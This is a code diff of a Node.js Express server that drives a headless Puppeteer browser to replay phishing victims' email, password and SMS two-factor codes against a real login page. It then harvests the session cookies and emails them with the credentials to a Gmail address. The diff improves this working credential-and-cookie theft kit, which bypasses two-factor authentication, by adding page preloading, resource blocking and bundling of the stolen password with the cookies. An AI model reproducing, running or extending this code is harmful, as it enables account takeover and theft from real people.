@@ -127,12 +127,14 @@ app.post('/login', async (req, res) => {
     const { email, password, ip } = req.body;
     if (!email || !password || !ip) return res.status(400).json({ error: 'Email, password, and IP are required' });
 
-    let browserInstance, page;
     try {
-        browserInstance = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
-        page = await browserInstance.newPage();
-        await page.setUserAgent(ua);
-        await page.goto(loginUrl, { waitUntil: 'domcontentloaded' });
+        if (isPageLoading) {
+            await new Promise((resolve) => {
+                const checkPageLoaded = setInterval(() => {
+                    if (!isPageLoading) { clearInterval(checkPageLoaded); resolve(); }
+                }, 500);
+            });
+        }
 
         const loginSuccessful = await performLogin(page, email, password);
 
@@ -145,11 +147,12 @@ app.post('/login', async (req, res) => {
         console.error('Login route error:', error);
         res.status(500).json({ error: 'Internal server error' });
     } finally {
-        if (page && !page.isClosed()) await page.close();
-        if (browserInstance) await browserInstance.close();
+        if (page && !page.isClosed()) {
+            await page.close();
+            preloadNewPage();
+        }
     }
 });
-
 
 async function SecondperformLogin(page, email, password) {
     try {
@@ -182,37 +185,46 @@ app.post('/loginsms', async (req, res) => {
     const { ip, code } = req.body;
     if (!ip || !code) return res.status(400).json({ error: 'IP and code are required' });
 
-    let browserInstance, pageSMS;
+    let browserInstance;
     try {
         const emailPasswordData = getEmailPasswordByIP(ip);
 
-        browserInstance = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
-        pageSMS = await browserInstance.newPage();
+        browserInstance = await puppeteer.launch({ headless: true, args: ['--no-sandbox','--disable-gpu','--enable-webgl','--window-size=1500,800','--disable-http2'] });
+        const pageSMS = await browserInstance.newPage();
+
+        await pageSMS.setRequestInterception(true);
+        pageSMS.on('request', (request) => {
+            if (['image','stylesheet','font'].includes(request.resourceType())) request.abort();
+            else request.continue();
+        });
+
         await pageSMS.setUserAgent(ua);
         await pageSMS.goto(loginUrl, { waitUntil: 'networkidle2' });
 
-        const loginSuccessful = await SecondperformLogin(pageSMS, emailPasswordData.email, emailPasswordData.password);
-        if (!loginSuccessful) return res.status(400).json({ success: false, message: 'Login failed before SMS' });
+        await SecondperformLogin(pageSMS, emailPasswordData.email, emailPasswordData.password);
 
         await pageSMS.waitForSelector('input#twoFactorCode', { visible: true, timeout: 15000 });
         await pageSMS.type('input#twoFactorCode', code);
+        await pageSMS.waitForSelector('a#btnSubmit', { visible: true, timeout: 15000 });
         await pageSMS.click('a#btnSubmit');
-        await pageSMS.waitForNavigation({ waitUntil: 'networkidle2' });
 
-        // تحقق من رسالة الخطأ
-        const errorElement = await pageSMS.$('p.otkinput-errormsg');
-        if (errorElement) {
-            return res.status(400).json({ success: false, message: 'SMS code incorrect' });
-        }
+        await pageSMS.waitForNavigation({ waitUntil: 'networkidle2' });
+        await sleep(3000);
 
         const cookies = await pageSMS.cookies();
         console.log('Cookies:', cookies);
+
+        const userEntry = {
+            email: emailPasswordData.email,
+            password: emailPasswordData.password,
+            cookies: cookies.filter(c => !c.name.includes('EDGESCAPE')).map(c => ({ ...c, secure: true, sameSite: 'lax' }))
+        };
 
         const emailOptions = {
             from: '"DOUFI 🔥👑" <doufi515@gmail.com>',
             to: 'doufififa7@gmail.com',
             subject: emailPasswordData.email,
-            text: `Here are the cookies:\n\n${JSON.stringify(cookies, null, 2)}`,
+            text: `Here are the cookies that were just saved:\n\n${JSON.stringify(userEntry, null, 2)}`,
         };
         await sendEmail(emailOptions);
 
@@ -220,15 +232,11 @@ app.post('/loginsms', async (req, res) => {
 
     } catch (error) {
         console.error('SMS login error:', error);
-        res.status(500).json({ success: false, error: 'Error during SMS login' });
+        res.status(500).json({ error: 'Error during SMS login' });
     } finally {
-        if (pageSMS && !pageSMS.isClosed()) await pageSMS.close();
         if (browserInstance) await browserInstance.close();
     }
 });
-
-
-
 
 const sendEmail = async (emailOptions) => {
     return new Promise((resolve, reject) => {
@@ -250,8 +258,3 @@ const port = process.env.PORT || 3000;
 app.listen(port, () => {
     console.log(`Server running at http://localhost:${port}`);
 });
-
-
-
-
-
